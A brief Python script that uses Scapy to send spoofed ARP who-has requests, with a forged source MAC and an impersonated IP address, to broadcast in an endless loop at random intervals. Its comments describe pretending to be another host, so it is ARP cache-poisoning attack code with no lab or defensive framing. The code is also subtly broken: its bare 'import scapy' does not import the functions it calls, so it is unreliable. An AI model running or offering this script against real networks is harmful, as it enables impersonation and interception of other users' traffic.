import scapy

# Basic ARP who-has request spoofing/falsifying a source mac

sendp(  #must be in sendp to hit Layer 2
    Ether(
        src="00:11:22:33:44:55",     # Source MAC you want to spoof
        dst="ff:ff:ff:ff:ff:ff"      # Broadcast MAC
    )/
    ARP(
        op="who-has",                # ARP operation: 1 for who-has (request)
        psrc="192.168.0.20",          # Source IP - IP you're pretending to be
        pdst="192.168.0.1",           # Target IP - who you're asking about
        hwsrc="00:11:22:33:44:55"
    ),
    inter=RandNum(1,4),            # Random interval between packets (1-4 seconds)
    loop=1                           # Keep sending packets (1=True)
)